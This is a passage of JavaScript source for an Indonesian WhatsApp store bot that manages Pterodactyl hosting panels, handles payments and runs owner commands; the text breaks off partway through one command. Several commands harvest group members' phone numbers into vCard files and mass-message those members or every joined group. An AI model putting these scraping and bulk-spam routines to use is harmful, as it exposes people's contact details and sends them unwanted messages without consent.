//================================================================================

case "listadmin": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *#- List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await FardanDev.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *#- List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await FardanDev.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//================================================================================

case "produk": {
await slideButton(m.chat)
}
break

//================================================================================

case "savekontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await FardanDev.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer FardanDev - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await FardanDev.sendMessage(m.sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./database/contacts.vcf", "")
}}
break
//================================================================================

case "savekontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer FardanDev - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await FardanDev.sendMessage(m.sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./database/contacts.vcf", "")
}}
break

//================================================================================

case "pushkontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("ɪᴅɢʀᴜᴘ|ᴘᴇsᴀɴɴʏᴀ"))
if (!text.split("|")) return m.reply(example("ɪᴅɢʀᴜᴘ|ᴘᴇsᴀɴɴʏᴀ"))
const [idgc, pes] = text.split("|")
const teks = pes
const jidawal = m.chat
const data = await FardanDev.groupMetadata(id)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`ᴍᴇᴍᴘʀᴏsᴇs *ᴘᴜsʜᴋᴏɴᴛᴀᴋ* ᴋᴇ ᴅᴀʟᴀᴍ ɢʀᴜᴘ *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentMsg  = await FardanDev.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await FardanDev.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await FardanDev.sendMessage(jidawal, {text: `*ʙᴇʀʜᴀsɪʟ ᴘᴜsʜᴋᴏɴᴛᴀᴋ*\ɴᴛᴏᴛᴀʟ ᴍᴇᴍʙᴇʀ ʙᴇʀʜᴀsɪʟ ᴅɪᴋɪʀɪᴍ ᴘᴇsᴀɴ : ${halls.length}`}, {quoted: m})
}
break

//================================================================================

case "pushkontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!text) return m.reply(example("ᴘᴇsᴀɴɴʏᴀ"))
const teks = text
const jidawal = m.chat
const data = await FardanDev.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`ᴍᴇᴍᴘʀᴏsᴇs *ᴘᴜsʜᴋᴏɴᴛᴀᴋ*`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentMsg  = await FardanDev.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await FardanDev.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await FardanDev.sendMessage(jidawal, {text: `*ʙᴇʀʜᴀsɪʟ ᴘᴜsʜᴋᴏɴᴛᴀᴋ*\ɴᴛᴏᴛᴀʟ ᴍᴇᴍʙᴇʀ ʙᴇʀʜᴀsɪʟ ᴅɪᴋɪʀɪᴍ ᴘᴇsᴀɴ : ${halls.length}`}, {quoted: m})
}
break

//================================================================================

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await FardanDev.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`ᴍᴇᴍᴘʀᴏsᴇs *ᴊᴘᴍsʟɪᴅᴇ* ᴋᴇ ${res.length} ɢʀᴏᴜᴘ`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await FardanDev.sendMessage(jid, {text: `*ᴊᴘᴍ ᴛᴇʟᴀʜ sᴇʟᴇsᴀɪ*\ɴᴛᴏᴛᴀʟ ɢʀᴏᴜᴘ ʏᴀɴɢ ʙᴇʀʜᴀsɪʟ ᴅɪᴋɪʀɪᴍ ᴘᴇsᴀɴ : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await FardanDev.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`ᴍᴇᴍᴘʀᴏsᴇs *ᴊᴘᴍsʟɪᴅᴇ ʜɪᴅᴇᴛᴀɢ* ᴋᴇ ${res.length} ɢʀᴏᴜᴘ`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await FardanDev.sendMessage(jid, {text: `*ᴊᴘᴍ ᴛᴇʟᴀʜ sᴇʟsᴀɪ*\ɴᴛᴏᴛᴀʟ ɢʀᴜᴘ ʏᴀɴɢ ʙᴇʀʜᴀsɪʟ ᴅɪᴋɪʀɪᴍ ᴘᴇsᴀɴ : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teksnya"))
let allgrup = await FardanDev.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`ᴍᴇᴍᴘʀᴏsᴇs *ᴊᴘᴍ* ᴛᴇᴋs ᴋᴇ ${res.length} ɢʀᴏᴜᴘ`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await FardanDev.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await FardanDev.sendMessage(jid, {text: `*ᴊᴘᴍ ᴛᴇʟᴀʜ sᴇʟᴇsᴀɪ*\ɴᴛᴏᴛᴀʟ ɢʀᴜᴘ ʏᴀɴɢ ʙᴇʀʜᴀsɪʟ ᴅɪᴋɪʀɪᴍ ᴘᴇsᴀɴ : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpm2": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("ᴛᴇᴋs ᴅᴇɴɢᴀɴ ᴍᴇɴɢɪʀɪᴍ ғᴏᴛᴏ"))
if (!/image/.test(mime)) return m.reply(example("ᴛᴇᴋs ᴅᴇɴɢᴀɴ ᴍᴇɴɢɪʀɪᴍ ғᴏᴛᴏ"))
const allgrup = await FardanDev.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await FardanDev.downloadAndSaveMediaMessage(qmsg)
await m.reply(`ᴍᴇᴍᴘʀᴏsᴇs *ᴊᴘᴍ* ᴛᴇᴋs & ғᴏᴛᴏ ᴋᴇ ${res.length} ɢʀᴏᴜᴘ`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await FardanDev.sendMessage(i, {image: fs.readFileSync(rest), caption: teks}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await FardanDev.sendMessage(jid, {text: `*ᴊᴘᴍ ᴛᴇʟᴀʜ sᴇʟᴇsᴀɪ*\ɴᴛᴏᴛᴀʟ ɢʀᴜᴘ ʏᴀɴɢ ʙᴇʀʜᴀsɪʟ ᴅɪᴋɪʀɪᴍ ᴘᴇsᴀɴ : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpmtesti": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("ᴛᴇᴋs ᴅᴇɴɢᴀɴ ᴍᴇɴɢɪʀɪᴍ ғᴏᴛᴏ"))
if (!/image/.test(mime)) return m.reply(example("ᴛᴇᴋs ᴅᴇɴɢᴀɴ ᴍᴇɴɢɪʀɪᴍ ғᴏᴛᴏ"))
const allgrup = await FardanDev.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await FardanDev.downloadAndSaveMediaMessage(qmsg)
await m.reply(`ᴍᴇᴍᴘʀᴏsᴇs *ᴊᴘᴍ* ᴛᴇsᴛɪᴍᴏɴɪ ᴋᴇ ${res.length} ɢʀᴏᴜᴘ`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await FardanDev.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: global.namaSaluran, newsletterJid: global.idSaluran }}}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await FardanDev.sendMessage(jid, {text: `*ᴊᴘᴍ ᴛᴇʟᴀʜ sᴇʟᴇsᴀɪ*\ɴᴛᴏᴛᴀʟ ɢʀᴜᴘ ʏᴀɴɢ ʙᴇʀʜᴀsɪʟ ᴅɪᴋɪʀɪᴍ ᴘᴇsᴀɴ : ${count}`}, {quoted: m})
}
break

//================================================================================

case "pay": case "payment": {
if (!isCreator) return Reply(mess.owner)
let imgdana = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/dana.jpg")}, { upload: FardanDev.waUploadToServer })
let imgovo = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/ovo.jpg")}, { upload: FardanDev.waUploadToServer })
let imggopay = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/gopay.jpg")}, { upload: FardanDev.waUploadToServer })
let imgqris = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/qris.jpg")}, { upload: FardanDev.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "\nᴘɪʟɪʜ sᴀʟᴀʜ sᴀᴛᴜ *ᴘᴀʏᴍᴇɴᴛ* ᴘᴇᴍʙᴀʏᴀʀᴀɴ ʏᴀɴɢ ᴛᴇʀsᴇᴅɪᴀ"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgdana
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Dana Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.dana}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgovo
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"OVO Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.ovo}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imggopay
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Gopay Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.gopay}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgqris
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\" ǫʀɪs ᴘᴀʏᴍᴇɴᴛ\",\"url\":\"${global.qris}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}
]
})
})}
}}, {userJid: m.sender, quoted: qtoko})
await FardanDev.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
break

//================================================================================

case "dana": {
if (!isCreator) return
let teks = `
*ᴘᴀʏᴍᴇɴᴛ ᴅᴀɴᴀ*

* *ɴᴏᴍᴏʀ :* ${global.dana}

*[ ! ] ᴘᴇɴᴛɪɴɢ :* \`\`\`ᴡᴀᴊɪʙ ᴋɪʀɪᴍᴋᴀɴ ʙᴜᴋᴛɪ ᴛʀᴀɴsғᴇʀ ᴅᴇᴍɪ ᴋᴇᴀᴍᴀɴᴀɴ ʙᴇʀsᴀᴍᴀ\`\`\`
`
await FardanDev.sendMessage(m.chat, {text: teks}, {quoted: qtoko})
}
break

//================================================================================

case "qris": {
if (!isCreator) return 
await FardanDev.sendMessage(m.chat, {image: {url: global.qris}, caption: "\n*ᴘᴀʏᴍᴇɴᴛ ǫʀɪs*\n\n*[ ! ] ᴘᴇɴᴛɪɴɢ :* \`\`\`ᴡᴀᴊɪʙ ᴋɪʀɪᴍᴋᴀɴ ʙᴜᴋᴛɪ ᴛʀᴀɴsғᴇʀ ᴅᴇᴍɪ ᴋᴇᴀᴍᴀɴᴀɴ ʙᴇʀsᴀᴍᴀ\`\`\`"}, {quoted: qtoko})
}
break

//================================================================================

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//================================================================================

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("ᴊᴀsᴀ ɪɴsᴛᴀʟʟ ᴘᴀɴᴇʟ"))
const msg = {
text: `*ᴅᴀɴᴀ ᴍᴀsᴜᴋ*
📦 ${text}

_*© 2024 - Fuza STORE*_`
}
await FardanDev.sendMessage(m.chat, msg, {quoted: null})
}
break

//================================================================================

case "done": {
  if (!text) return m.reply(example("ᴘʀᴏᴅᴜᴋ|ʜᴀʀɢᴀ|ᴘᴀʏᴍᴇɴᴛ|ᴛᴀɴɢɢᴀʟ|ɴᴏᴍɪɴᴀʟ|ɢᴀʀᴀɴsɪ"));
  
  let vii = text.split("|");
  
  // Memastikan ada minimal 6 item dalam array
  if (vii.length < 6) return m.reply(example("ᴘʀᴏᴅᴜᴋ|ʜᴀʀɢᴀ|ᴘᴀʏᴍᴇɴᴛ|ᴛᴀɴɢɢᴀʟ|ɴᴏᴍɪɴᴀʟ|ɢᴀʀᴀɴsɪ"));

  // Membuat pesan menggunakan template literal
  const msg = {
    text: `╔───────────────────
╎ [ 📦 ] _Product_    : ${vii[0]}
╎ [ 💵 ] _Price_      : ${vii[1]}
╎ [ 📠 ] _Payment_    : ${vii[2]}
╎ [ 📝 ] _Status_     : DONE
╎ [ 📅 ] _Tanggal_    : ${vii[3]}
╚───────────────────
╔───────────────────
╎ [ 🛒 ] _Count_      : ${vii[4]}
╎ [ 🌟 ] _Garansi_    : ${vii[5]}
╚───────────────────
   *Note:* Terimakasih Telah Membeli
             Product *FuZa - Store* Ditunggu
             Next Ordernya, Jangan Lupa
             Untuk Membeli Product kami.

_*- ALL TRX NO REFFUND -*_`
  };

  // Mengirim pesan
  await FardanDev.sendMessage(m.chat, msg, { quoted: null });
}
break;




//================================================================================

case "developerbot": case "owner": {
await FardanDev.sendContact(m.chat, [global.owner], m)
}
break

//================================================================================

case "save": case "sv": {
if (!isCreator) return
await FardanDev.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//================================================================================

case "self": {
if (!isCreator) return
FardanDev.public = false
m.reply("ʙᴇʀʜᴀsɪʟ ᴍᴇɴɢɢᴀɴᴛɪ ᴋᴇ ᴍᴏᴅᴇ *sᴇʟғ*")
}
break

//================================================================================

case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./FardanDev.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

//================================================================================

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 ɪɴғᴏʀᴍᴀᴛɪᴏɴ sᴇʀᴠᴇʀ*

*• ᴘʟᴀᴛғᴏʀᴍ :* ${nou.os.type()}
*• ᴛᴏᴛᴀʟ ʀᴀᴍ :* ${formatp(os.totalmem())}
*• ᴛᴏᴛᴀʟ ᴅɪsᴋ :* ${tot.totalGb} ɢʙ
*• ᴛᴏᴛᴀʟ ᴄᴘᴜ :* ${os.cpus().length} Core
*• ʀᴜɴᴛɪᴍᴇ ᴠᴘs :* ${runtime(os.uptime())}

*🔵 ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʙᴏᴛ*

*• ʀᴇsᴘᴏɴ sᴘᴇᴇᴅ :* ${latensi.toFixed(4)} ᴅᴇᴛɪᴋ
*• ʀᴜɴᴛɪᴍᴇ ʙᴏᴛ :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break

//================================================================================

case "public": {
if (!isCreator) return
FardanDev.public = true
m.reply("ʙᴇʀʜᴀsɪʟ ᴍᴇɴɢɢᴀɴᴛɪ ᴋᴇ ᴍᴏᴅᴇ *ᴘᴜʙʟɪᴄ*")
}
break

//================================================================================

case "restart": case "rst": {
if (!isCreator) return Reply(mess.owner)
await m.reply("ᴍᴇᴍᴘʀᴏsᴇs _ʀᴇsᴛᴀʀᴛ sᴇʀᴠᴇʀ_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//================================================================================

case "upchannel": case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya"))
await FardanDev.sendMessage(idSaluran, {text: text})
m.reply("ʙᴇʀʜᴀsɪʟ ᴍᴇɴɢɪʀɪᴍ ᴘᴇsᴀɴ *ᴛᴇᴋs* ᴋᴇ ᴅᴀʟᴀᴍ ᴄʜᴀɴɴᴇʟ ᴡʜᴀᴛsᴀᴘᴘ")
}
break

//================================================================================

case "upchannel2": case "upch2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("ᴛᴇᴋsɴʏᴀ ᴅᴇɴɢᴀɴ ᴍᴇɴɢɪʀɪᴍ ғᴏᴛᴏ"))
if (!/image/.test(mime)) return m.reply(example("ᴛᴇᴋsɴʏᴀ ᴅᴇɴɢᴀɴ ᴍᴇɴɢɪʀɪᴍ ғᴏᴛᴏ"))
let img = await FardanDev.downloadAndSaveMediaMessage(qmsg)
await FardanDev.sendMessage(idSaluran, {image: await fs.readFileSync(img), caption: text})
m.reply("ʙᴇʀʜᴀsɪʟ ᴍᴇɴɢɪʀɪᴍ ᴘᴇsᴀɴ *ᴛᴇᴋs & ғᴏᴛᴏ* ᴋᴇ ᴅᴀʟᴀᴍ ᴄʜᴀɴɴᴇʟ ᴡʜᴀᴛsᴀᴘᴘ")
await fs.unlinkSync(img)
}
break

//================================================================================

case "getsc": {
if (!isCreator) return Reply(mess.owner)
let dir = await fs.readdirSync("./database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./database/sampah/${i}`)
}}
await m.reply("ᴍᴇᴍᴘʀᴏsᴇs ʙᴀᴄᴋᴜᴘ sᴄʀɪᴘᴛ ʙᴏᴛ")
var name = `Simple-Botz`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await FardanDev.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

//================================================================================

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

//================================================================================

case "setppbot": {
if (!isCreator) return Reply(mess.owner)
if (/image/g.test(mime)) {
var medis = await FardanDev.downloadAndSaveMediaMessage(qmsg)
if (args[0] && args[0] == "panjang") {
const { img } = await generateProfilePicture(medis)
await FardanDev.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
} else {
await FardanDev.updateProfilePicture(botNumber, {content: medis})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
}
} else return m.reply(example('dengan mengirim foto'))
}
break

//================================================================================

case "setimgmenu": {
if (!isCreator) return Reply(mess.owner)
if (!/image/.test(mime)) return m.reply(example('reply fotonya'))
await FardanDev.downloadAndSaveMediaMessage(qmsg, "./src/media/menu.jpg", false)
await m.reply("Berhasil mengganti image menu ✅")
}
break

//================================================================================

case "setimgfake": {
if (!isCreator) return Reply(mess.owner)
if (!/image/.test(mime)) return m.reply(example('reply fotonya'))
await FardanDev.downloadAndSaveMediaMessage(qmsg, "./src/media/fake.jpg", false)
await m.reply("Berhasil mengganti image fake ✅")
}
break

//================================================================================

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
FardanDev.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//================================================================================

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *#- List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
FardanDev.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//================================================================================

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//================================================================================

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
